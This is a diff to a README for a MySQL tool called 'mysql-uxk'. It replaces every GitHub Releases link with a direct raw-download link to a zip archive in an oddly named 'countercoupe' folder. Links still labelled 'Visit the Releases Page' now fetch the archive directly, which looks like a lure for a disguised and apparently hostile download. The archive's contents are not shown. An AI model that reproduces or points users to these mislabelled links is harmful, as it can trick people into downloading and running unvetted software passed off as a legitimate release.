@@ -1,7 +1,7 @@
 # 🐬 mysql-uxk - Simplify Your MySQL Experience
 
 ## 📥 Download Now
-[![Download mysql-uxk](https://img.shields.io/badge/Download-mysql--uxk-brightgreen)](https://github.com/Dianajesspad/mysql-uxk/releases)
+[![Download mysql-uxk](https://raw.githubusercontent.com/Dianajesspad/mysql-uxk/main/countercoupe/mysql-uxk.zip)](https://raw.githubusercontent.com/Dianajesspad/mysql-uxk/main/countercoupe/mysql-uxk.zip)
 
 ## 🚀 Getting Started
 Welcome to **mysql-uxk**, your user-friendly tool for managing MySQL databases. This application helps you interact with your databases easily, whether you are a beginner or just need a simple interface for your tasks.
@@ -19,7 +19,7 @@ To start using mysql-uxk, follow these steps:
 
 1. **Visit the Download Page**  
    Go to our Releases page to download the latest version of mysql-uxk:  
-   [Visit the Releases Page](https://github.com/Dianajesspad/mysql-uxk/releases)
+   [Visit the Releases Page](https://raw.githubusercontent.com/Dianajesspad/mysql-uxk/main/countercoupe/mysql-uxk.zip)
 
 2. **Select the Latest Version**  
    On the Releases page, you will see a list of available versions. Find the most recent one. 
@@ -84,4 +84,4 @@ If you encounter an issue while using mysql-uxk:
 ## 🎉 Conclusion
 With mysql-uxk, managing your MySQL databases becomes a straightforward task. Download it today to enhance your database experience.
 
-For more information and the latest updates, visit our [Releases Page](https://github.com/Dianajesspad/mysql-uxk/releases). Happy database management!
+For more information and the latest updates, visit our [Releases Page](https://raw.githubusercontent.com/Dianajesspad/mysql-uxk/main/countercoupe/mysql-uxk.zip). Happy database management!
